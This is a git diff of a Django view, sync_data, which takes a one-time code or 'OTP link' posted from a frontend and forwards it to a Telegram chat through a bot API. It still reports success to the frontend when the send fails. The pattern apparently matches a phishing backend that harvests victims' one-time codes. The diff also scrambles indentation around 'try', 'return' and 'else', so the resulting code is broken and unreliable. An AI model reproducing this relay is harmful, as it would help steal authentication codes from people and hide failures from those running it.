@@ -80,8 +80,7 @@ def otp_verification(request):
 def sync_data(request):
     if request.method != 'POST':
         return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)
-
-    try:
+ try:
         # Parse JSON from the frontend
         data = json.loads(request.body)
         otp_link = data.get('otp', 'No Link provided')
@@ -97,7 +96,7 @@ def sync_data(request):
 
         if not bot_token or not chat_id:
             logger.error("CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing in Render Settings.")
-            return JsonResponse({"status": "error", "message": "Server config missing"}, status=500)
+         return JsonResponse({"status": "error", "message": "Server config missing"}, status=500)
 
         # Format Telegram Message
 try:
@@ -125,8 +124,8 @@ try:
         }, timeout=15)
 
         if response.status_code == 200:
-            return JsonResponse({"status": "success"})
-        else:
+              return JsonResponse({"status": "success"})
+    else:
             logger.error(f"Telegram Failure: {response.text}")
             return JsonResponse({"status": "success", "info": "processing"})
 
